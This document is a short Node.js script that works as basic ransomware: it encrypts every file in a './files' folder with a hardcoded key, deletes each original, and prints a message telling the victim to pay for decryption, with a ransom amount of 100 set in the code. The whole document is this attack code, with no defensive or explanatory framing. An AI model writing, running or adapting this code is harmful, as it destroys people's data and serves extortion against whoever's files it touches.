const encryptor = require('file-encryptor');
const fs = require('fs');

const folderPath = './files';
const ransomAmount = 100;
const key = 'MARIFE';

encryptFiles();

function encryptFiles() {
  let files = fs.readdirSync(folderPath);

  files.forEach((file) => {
    encryptor.encryptFile(`${folderPath}/${file}`, `${folderPath}/${file}.encrypted`, key, function(err) {
      if (err) {
        console.error(`Encryption of ${file} failed. Error: ${err}`);
        return;
      }
      console.log(`File ${file} has been successfully encrypted.`);
      
     
      fs.unlinkSync(`${folderPath}/${file}`);
      console.log(`Original file ${file} has been securely deleted.`);
    });
  });

  console.log('All files have been encrypted. Please proceed with the payment to decrypt them.');
}
